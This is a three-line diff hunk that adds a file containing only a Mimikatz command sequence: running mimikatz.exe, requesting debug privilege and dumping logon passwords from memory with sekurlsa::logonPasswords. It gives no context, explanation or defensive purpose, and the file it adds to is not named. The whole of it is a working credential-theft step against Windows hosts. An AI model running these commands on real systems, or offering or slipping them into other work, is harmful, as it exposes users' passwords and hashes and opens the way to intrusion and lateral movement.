@@ -1,0 +1,3 @@
+Run mimikatz.exe
+privilege::debug
+sekurlsa::logonPasswords
